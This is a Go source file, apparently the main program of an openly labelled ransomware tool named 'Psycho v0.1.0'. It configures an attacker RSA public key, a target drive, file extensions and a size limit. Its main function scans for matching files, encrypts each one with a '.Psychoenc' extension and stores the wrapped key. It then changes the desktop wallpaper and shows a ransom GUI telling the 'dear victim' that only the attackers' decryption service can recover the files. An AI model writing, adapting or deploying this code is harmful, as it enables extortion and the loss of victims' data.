package main

/***
Psycho v0.1.0
written by: amirali rafie
github: https://github.com/Null-byte-00
***/

import (
	"./src/gui"
	"./src/changedesktop"
	"./src/encryption"
	"./src/files"
)

func main() {
	/*** SETTINGS ***/
	//server rsa public key ( if you want to change this you should first generate a rsa keypair next replace it in both ransomware and decryptor programs )
	serverpubkey := "-----BEGIN PUBLIC KEY-----\nMIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA3eWrYNmEzwLXGT0HUqqu\nkrimoiBKZE9mIzWvN51YLONneY0B8/yiLgJxg5pUOp8AEnu3gQm9uPQzbdyZniQq\n58HzSS+2Py17/UWlwqZVueUQ/RBvhH/BaEDZlKK7SUzeUqWbC0klDeLQ1nY48DEJ\nD2wNkz3CWXgDqQ0tfOqy+hRrR6ispOZc7k2SDd6cX8jkKzacH7sxBDYDVT2E/nYP\nkOBcCUW2ywN/y0FE1uqxim+axwtFW652k5ARHalmOVIXM6Oky6r4x49MN8zkIZEC\nhGDIOxQGYUEtp+0NhmAMyl26DtI23NMjyTaB7+DYtEZzSYgBllmfla1RtoEgKaHI\ns30PIUvZQGmg6VcEEhfy0hbtjDjWANkBrNewK46mH9pwH2wsYmm9QSftUjF62PbM\nLrFxoJS1w6NeYTC+s5JqGnG3sftCzGXMI+VSRvoVAWU+mm/ntQj5yww4nRq4Ylre\nJZAsLRUfT87c5uomolGitlGPIyXjxhxgPzc5egvQ199BAgMBAAE=\n-----END PUBLIC KEY-----"
	//root directory ( only files in this directory and subfolders of this directory will be encrypted )
	rootdir := "H:\\"
	//valid file extensions to encrypt ( only files with these extensions will be encrypted )
	validfileextensions := []string{"lnk" ,"pdf", "doc", "docx", "docm", "xlsx", "xlsm", "jpg", "jpeg", "png", "mp3", "mp4", "mkv", "py", "cs", "c", "cpp"}
	//valid file size to encrypt ( only files that have the same or less weight than this will be encrypted )
	//here is 400MB --> 1024 * 1024 * 400 = 419430400
	validfilesize := 419430400
	//the massage you want to show to the victim
	message := "Hi dear victim!\n"
	message += "Some of your files are encrypted now\n"
	message += "do not waste your time there is no way \nto get your files back except our decryption service"


	//scan all valid files to encrypt
	scanner := files.NewFiles(rootdir, validfileextensions, validfilesize)
	filestoencrypt, _ := scanner.ScanToencrypt()

	//create new encryptor
	encryptor := encryption.NewEncryption(serverpubkey, ".Psychoenc")
	//encrypt files 
	for i := range filestoencrypt {
		encryptor.Encryptfile(filestoencrypt[i])
	}
	//create a test.PSYCHO file
	encryptor.Createtest()
	//remove aes random key from memory and write encrypted key on disk
	encryptor.End()

	//write background image data in a file
	changedesktop.Writedata("psycho.png")
	//set it as background image
	changedesktop.Setbackground("psycho.png")

	//create new gui struct object
	w := gui.NewGui(rootdir, message)
	//run the gui 
	w.Run()
}